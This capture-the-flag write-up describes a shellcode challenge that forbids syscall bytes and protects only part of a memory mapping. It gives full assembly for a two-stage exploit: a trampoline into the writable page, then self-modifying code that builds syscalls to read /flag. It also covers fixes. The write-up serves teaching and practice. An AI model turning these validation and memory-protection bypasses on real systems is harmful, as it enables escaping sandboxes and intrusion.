# CTF Write-up: Syscall Shenanigans Challenge

## Challenge Overview
**Challenge Name:** Syscall Shenanigans  
**Category:** Binary Exploitation/Pwn  
**Description:** "Write and execute shellcode to read the flag, but the inputted data cannot contain any form of system call bytes (syscall, sysenter, int), this challenge adds an extra layer of difficulty!"

## Vulnerability Analysis

### Enhanced Protection Mechanism
This challenge builds upon the previous "Syscall Smuggler" by adding a critical security enhancement:

1. **Memory Protection**: After shellcode validation but before execution, the program calls:
   ```c
   mprotect(shellcode_address, 0x1000, PROT_READ | PROT_EXEC);
   ```
   This makes the **first 4096 bytes of the shellcode memory read-only**.

2. **Large Allocation**: The program allocates 8192 bytes (0x2000) via `mmap`, but only protects the first half.

### The Vulnerability: Partial Memory Protection
The critical flaw is that **only the first 0x1000 bytes are made read-only**, while the **second 0x1000 bytes remain writable and executable**. This creates a "safe haven" where we can execute unrestricted shellcode.

## Exploitation Strategy

### Two-Stage Shellcode Approach
The exploit uses a clever two-stage approach:

**Stage 1 (Validation-Safe Code in Read-Only Region):**
- Located in the first 4096 bytes (0x29f4d000-0x29f4dfff)
- Contains no forbidden instructions
- Simple trampoline: `mov rax, 0x29f4e000; jmp rax`

**Stage 2 (Full Shellcode in Writable Region):**
- Located in the second 4096 bytes (0x29f4e000-0x29f4efff) 
- Can contain `syscall` instructions and self-modifying code
- Performs the actual flag reading

### Exploit Code Breakdown

```nasm
.global _start
.intel_syntax noprefix

_start:
    ; Stage 1: Simple jump to stage 2
    mov rax, 0x29f4e000  ; Address of stage 2 (writable region)
    jmp rax              ; Transfer control

    ; Pad to ensure stage 2 starts in writable region
    .rept 0x1000 - (. - _start)
    nop
    .endr

    ; Stage 2: Full shellcode with syscalls
    ; Open /flag file
    mov rax, 2                    ; open syscall
    lea rdi, [rip + flag_path]    ; filename
    xor rsi, rsi                  ; O_RDONLY = 0
    
    ; Self-modifying syscall creation
    mov byte ptr [rip + sys1], 0x0f
    mov byte ptr [rip + sys1+1], 0x05
sys1:
    .byte 0x0e, 0x04  ; Becomes syscall
    
    ; Read flag content
    mov rdi, rax                  ; fd from open
    mov rax, 0                    ; read syscall
    mov rsi, 0x29f4e200           ; buffer in writable region
    mov rdx, 100                  ; size
    
    mov byte ptr [rip + sys2], 0x0f
    mov byte ptr [rip + sys2+1], 0x05
sys2:
    .byte 0x0e, 0x04
    
    ; Write flag to stdout
    mov rax, 1                    ; write syscall
    mov rdi, 1                    ; stdout
    mov rsi, 0x29f4e200           ; buffer with flag content
    mov rdx, 100                  ; size
    
    mov byte ptr [rip + sys3], 0x0f
    mov byte ptr [rip + sys3+1], 0x05
sys3:
    .byte 0x0e, 0x04
    
    ; Exit cleanly
    mov rax, 60                   ; exit syscall
    xor rdi, rdi                  ; status 0
    
    mov byte ptr [rip + sys4], 0x0f
    mov byte ptr [rip + sys4+1], 0x05
sys4:
    .byte 0x0e, 0x04

flag_path:
    .string "/flag"
```

## Why This Works

### Bypassing Validation
- **Stage 1** contains only a `mov` and `jmp` instruction - no forbidden bytes
- The validation scan passes because it only sees harmless instructions

### Bypassing Memory Protection
- **Stage 1** executes in read-only memory but doesn't need to modify itself
- The `jmp` instruction transfers control to **Stage 2** in the writable region
- **Stage 2** can freely use self-modifying code to create `syscall` instructions

### Memory Layout Exploitation
```
0x29f4d000-0x29f4dfff: Stage 1 (Read-Only, Executable)
0x29f4e000-0x29f4efff: Stage 2 (Read-Write-Executable) ← Safe haven!
```

## Key Insights

1. **Partial Protection is Not Enough**: Protecting only part of an executable region is insufficient if attackers can jump to unprotected areas.

2. **Fixed Address Advantage**: Knowing the exact load address (0x29f4d000) allows precise calculation of the writable region.

3. **Size Calculation**: The `.rept` directive ensures Stage 2 starts exactly at the writable boundary.

4. **Defense Evasion**: The two-stage approach separates "clean" code (that passes validation) from "dirty" code (that does the real work).

## Prevention

To properly fix this vulnerability:

1. **Protect the Entire Allocation**:
   ```c
   mprotect(shellcode_address, 0x2000, PROT_READ | PROT_EXEC);
   ```

2. **Use Smaller Allocations**: Only allocate what's needed rather than leaving writable gaps.

3. **Emulation/Sandboxing**: Execute shellcode in a controlled environment rather than directly.

4. **Re-validation**: Scan memory again right before execution.

## Conclusion

The "Syscall Shenanigans" challenge demonstrates the importance of comprehensive memory protection. Partial security measures often create false confidence while leaving exploitable gaps. The two-stage shellcode approach successfully bypassed both the static validation and runtime memory protection by leveraging the unintended writable region, highlighting that security must be end-to-end to be effective.

This exploit combines spatial separation (different memory regions) with temporal separation (different execution stages) to defeat layered defenses - a powerful technique applicable to many advanced exploitation scenarios.
